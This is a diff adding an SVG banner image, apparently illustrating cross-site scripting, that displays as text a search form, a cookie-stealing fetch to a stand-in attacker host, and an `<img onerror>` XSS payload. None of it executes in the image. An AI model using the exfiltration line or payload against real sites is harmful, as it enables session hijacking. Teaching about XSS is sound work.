@@ -1,0 +1,15 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 630">
+  <rect width="1200" height="630" fill="#f3efe9"/>
+  <g font-family="ui-monospace, Menlo, monospace" font-size="22" fill="#c6bfb4">
+    <text x="80" y="110">&lt;form action="/ara" method="GET"&gt;</text>
+    <text x="110" y="150">&lt;input name="q" value="..."&gt;</text>
+    <text x="80" y="190">&lt;/form&gt;</text>
+    <text x="80" y="520">document.cookie  // session=eyJhbGciOi...</text>
+    <text x="80" y="560">fetch("//saldirgan.example/?c=" + document.cookie)</text>
+  </g>
+  <rect x="64" y="262" width="1072" height="128" rx="14" fill="#161a22"/>
+  <g font-family="ui-monospace, Menlo, monospace" font-size="46" font-weight="600">
+    <text x="104" y="342" fill="#e7e9ed">&lt;img src=x <tspan fill="#ff6b57">onerror</tspan>=alert(1)&gt;</text>
+  </g>
+  <rect x="1060" y="300" width="22" height="52" fill="#ff6b57"/>
+</svg>
